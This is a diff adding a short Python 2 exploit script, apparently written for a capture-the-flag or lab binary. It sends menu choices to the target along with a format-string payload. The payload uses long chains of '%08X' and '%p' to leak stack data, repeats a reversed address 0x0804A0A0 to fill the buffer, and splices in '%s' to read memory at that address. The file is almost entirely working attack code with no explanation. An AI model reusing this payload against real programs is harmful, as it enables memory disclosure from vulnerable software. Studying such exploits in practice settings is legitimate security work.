@@ -1,0 +1,37 @@
+#!/usr/bin/env python 
+
+import time
+
+
+def w():
+    time.sleep(0.1)
+
+LONG = "%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X"
+LONG = "%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X"
+LONG = "%p" * (len(LONG) / 2)
+ADDR = "\x08\x04\xA0\xA0"
+ADDR = "\x08\x04\xA0\xA0"[::-1]
+
+print 1
+w()
+print ADDR * (256 / 4 - 4)
+w()
+print 1
+w()
+print LONG
+w()
+print 2
+w()
+print 1
+w()
+s = 64
+LONG = LONG[:s] + "%s" + LONG[s+2:]
+print LONG
+w()
+print 2
+w()
+
+print 3
+w()
+print 3
+
